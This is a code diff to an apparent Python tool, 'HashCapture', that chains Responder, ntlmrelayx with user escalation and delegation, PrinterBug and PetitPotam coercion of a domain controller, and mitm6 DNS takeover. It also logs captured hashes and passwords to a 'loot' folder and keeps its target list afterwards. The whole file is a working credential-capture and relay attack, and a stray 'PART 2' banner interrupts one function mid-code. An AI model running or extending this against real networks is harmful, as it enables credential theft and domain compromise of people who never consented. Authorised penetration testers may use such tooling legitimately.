@@ -42,6 +42,9 @@ class HashCapture:
         self.original_ipv6_forward = None
         self.dc_ip = None
 
+        # Create loot directory
+        os.makedirs("loot", exist_ok=True)
+
         # Initialize logger
         self.logger = logging.getLogger(__name__)
         
@@ -60,7 +63,7 @@ class HashCapture:
             console_handler = logging.StreamHandler(sys.stdout)
             console_handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
             logger.addHandler(console_handler)
-            file_handler = logging.FileHandler(f'{name}_attack.log')
+            file_handler = logging.FileHandler(f'loot/{name}_attack.log')
             file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
             logger.addHandler(file_handler)
 
@@ -150,6 +153,9 @@ class HashCapture:
                     line = line.strip()
                     if line:
                         logger.debug(f"{prefix}: {line}")
+                        # Check for captured hashes/credentials
+                        if "hash:" in line.lower() or "password:" in line.lower():
+                            logger.info(f"Captured credential: {line}")
         except Exception as e:
             logger.error(f"Error processing output: {e}")
 
@@ -159,9 +165,10 @@ class HashCapture:
             cmd = [
                 "responder",
                 "-I", self.interface,
-                "-wd",  # Enable WPAD
-                "--lm",  # Enable LM downgrade for better compatibility
-                "-v"  # Verbose output
+                "-wd",  # Enable WPAD and DHCP
+                "-i", self.local_ip,  # Set interface IP
+                "--lm",  # Enable LM downgrade
+                "--disable-ess"  # Disable ESS
             ]
             
             process = Popen(cmd, stdout=PIPE, stderr=STDOUT, universal_newlines=True)
@@ -178,19 +185,20 @@ class HashCapture:
                 "ntlmrelayx.py",
                 "-tf", "targets.txt",
                 "-smb2support",
-                "-6",  # Enable IPv6
+                "-6",  # IPv6 support
                 "-wh", "Proxy-Service",
-                "-of", "hashes/ntlmrelay-hashes",
-                "-wa", "3",
-                "--no-http-server",  # Disable HTTP server
-                "--no-wcf-server",   # Disable WCF server
-                "--escalate-user", "icebreaker",  # Target user to escalate
-                "--no-pass",  # Don't require password
-                "--no-acl"   # Don't check ACLs
+                "-l", "loot",  # Output directory
+                "--no-http-server",
+                "--no-wcf-server"
             ]
             
             if self.domain:
-                cmd.extend(["-domain", self.domain])
+                cmd.extend([
+                    "-domain", self.domain,
+                    "--delegate-access",  # Enable delegation
+                    "--escalate-user", "icebreaker",  # Target user to escalate
+                    "--no-acl"  # Skip ACL checks
+                ])
             
             process = Popen(cmd, stdout=PIPE, stderr=STDOUT, universal_newlines=True)
             self.processes["ntlmrelay"] = process
@@ -207,16 +215,18 @@ class HashCapture:
         try:
             cmd = [
                 "printerbug.py",
-                f"{self.domain}/{self.dc_ip}",
-                self.local_ip,
                 "-d", self.domain,
-                "-port", "445",
-                "-no-pass"
+                "-dc-ip", self.dc_ip,  # Specify DC IP
+                "-port", "445",  # SMB port
+                "-target", f"{self.domain}/{self.dc_ip}",  # Target
+                "-listener", self.local_ip  # Our IP
             ]
             
             if self.creds:
                 username, password = self.creds.split(':')
                 cmd.extend(["-u", username, "-p", password])
+            else:
+                cmd.append("-no-pass")
             
             process = Popen(cmd, stdout=PIPE, stderr=STDOUT, universal_newlines=True)
             self.processes["printerbug"] = process
@@ -233,15 +243,17 @@ class HashCapture:
         try:
             cmd = [
                 "petitpotam.py",
-                self.local_ip,
-                self.dc_ip,
                 "-d", self.domain,
-                "-no-pass"
+                "-dc-ip", self.dc_ip,
+                self.dc_ip,  # Target DC
+                self.local_ip  # Callback address
             ]
             
             if self.creds:
                 username, password = self.creds.split(':')
                 cmd.extend(["-u", username, "-p", password])
+            else:
+                cmd.append("-no-pass")
             
             process = Popen(cmd, stdout=PIPE, stderr=STDOUT, universal_newlines=True)
             self.processes["petitpotam"] = process
@@ -251,36 +263,35 @@ class HashCapture:
             self.logger.error(f"Error in start_petitpotam: {e}")
 
     def release_dns_port(self):
-        """Attempt to release port 53"""
+        """Release port 53 for MITM6"""
         try:
-            subprocess.run(["sudo", "systemctl", "stop", "systemd-resolved"], check=False)
-            subprocess.run(["sudo", "killall", "-9", "named"], check=False)
-            subprocess.run(["sudo", "killall", "-9", "bind9"], check=False)
-            subprocess.run(["sudo", "killall", "-9", "unbound"], check=False)
-            subprocess.run(["sudo", "fuser", "-k", "53/udp"], check=False)
-            subprocess.run(["sudo", "fuser", "-k", "53/tcp"], check=False)
-            self.logger.info("Successfully attempted to release DNS port 53")
+            subprocess.run(["systemctl", "stop", "systemd-resolved"], check=False)
+            subprocess.run(["killall", "-9", "named"], check=False)
+            subprocess.run(["killall", "-9", "bind9"], check=False)
+            subprocess.run(["killall", "-9", "unbound"], check=False)
+            subprocess.run(["fuser", "-k", "53/udp"], check=False)
+            subprocess.run(["fuser", "-k", "53/tcp"], check=False)
+            self.logger.info("Successfully released DNS port 53")
         except Exception as e:
             self.logger.warning(f"Error releasing DNS port: {e}")
 
     def start_mitm6(self):
-        """Start mitm6 attack"""
+        """Start MITM6 attack"""
         try:
+            # Release DNS port first
             self.release_dns_port()
 
             cmd = [
                 "mitm6",
                 "-i", self.interface,
-                "-d", self.domain,  # Target specific domain
-                "--ignore-nofqdn",  # Ignore hosts without FQDN
-                "--no-ra",  # Disable router advertisements
-                "--debug"
+                "-d", self.domain,  # Target domain
+                "--ignore-nofqdn"  # Ignore no FQDN
             ]
             
-            self.logger.info(f"Starting mitm6 with command: {' '.join(cmd)}")
+            self.logger.info(f"Starting MITM6 with command: {' '.join(cmd)}")
             
             env = os.environ.copy()
-            env["PYTHONIOENCODING"] = "utf-8"
+            env["PYTHONIOENCODING"] = "latin1"  # Use latin1 instead of utf-8
             env["PYTHONUNBUFFERED"] = "1"
             env["LANG"] = "C.UTF-8"
             
@@ -327,13 +338,7 @@ class HashCapture:
                 except Exception as e:
                     self.logger.error(f"Error restoring IPv6 forwarding: {e}")
 
-            for file in ['targets.txt']:
-                try:
-                    if os.path.exists(file):
-                        os.remove(file)
-                except Exception as e:
-                    self.logger.warning(f"Error removing {file}: {e}")
-
+            # Don't delete targets.txt to preserve attack context
             self.logger.info("Cleanup completed")
         except Exception as e:
             self.logger.error(f"Error in cleanup: {e}")
@@ -357,8 +362,15 @@ class HashCapture:
             return False
 
         try:
+            # Start with NTLM relay
+            self.logger.info("Starting NTLM relay...")
+            ntlmrelay_thread = Thread(target=self.start_ntlmrelay)
+            ntlmrelay_thread.daemon = True
+            ntlmrelay_thread.start()
+            time.sleep(2)  # Give it time to start
+
+            # Start other attacks
             attacks = [
-                ("NTLM Relay", self.start_ntlmrelay),
                 ("PetitPotam", self.start_petitpotam),
                 ("PrinterBug", self.start_printerbug)
             ]
@@ -375,12 +387,17 @@ class HashCapture:
                 except Exception as e:
                     self.logger.error(f"Failed to start {attack_name} attack: {e}")
             
+            # Start Responder
             self.logger.info(f"Starting Responder for {self.duration} seconds...")
             responder_thread = Thread(target=self.start_responder)
             responder_thread.daemon = True
             responder_thread.start()
             time.sleep(self.duration)
             self.stop_event.set()
+########################
+#       PART 2         #
+########################
+
             responder_thread.join(timeout=5)
             self.stop_event.clear()
 
